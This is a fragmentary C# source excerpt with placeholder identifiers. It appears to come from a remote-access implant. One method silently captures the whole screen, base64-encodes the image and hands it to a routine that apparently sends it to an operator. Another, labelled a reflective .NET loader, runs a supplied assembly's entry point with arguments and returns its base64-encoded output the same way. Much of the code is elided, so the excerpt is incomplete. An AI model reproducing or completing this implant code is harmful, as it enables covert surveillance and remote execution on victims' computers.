...
namespace VAR1
{
    ...
    public class VAR6
    {
        ...
        public static void VAR204()
        {
            ...
            {
                VAR203 += 1;
                VAR210 = new Bitmap(VAR214.Bounds.Width, VAR214.Bounds.Height, System.Drawing.Imaging.PixelFormat.Format32bppArgb);
                VAR212 = Graphics.FromImage(VAR210);
                VAR212.CopyFromScreen(VAR214.Bounds.X, VAR214.Bounds.Y, 0, 0, VAR214.Bounds.Size, CopyPixelOperation.SourceCopy);
                using (MemoryStream VAR205 = new MemoryStream())
                {
                    VAR210.Save(VAR205, ImageFormat.Png);
                    VAR201 = Convert.ToBase64String(VAR205.ToArray());
                    string VAR208 = String.Format("screenshot {0}", VAR201);
                    VAR21(VAR208, Guid.NewGuid().ToString());
                }
            }
        }
        ...
        protected static void VAR122(string VAR123, string VAR131)
        {
            ...
            if (File.Exists(VAR123.Split(' ')[0]))
            {
                FileStream VAR125 = new FileStream(VAR123, FileMode.Open);
            ...
            VAR132.Append("[ReflectiveDotNetLoader] EntryPoint is " + VAR129);
            if (VAR129 != null)
            {
                VAR132.Append("[ReflectiveDotNetLoader] Passing args: " + String.Join(" ", VAR127));
            ...
            VAR134.Close();
            VAR21(Convert.ToBase64String(Encoding.UTF8.GetBytes(VAR132.ToString())), VAR45);
        }
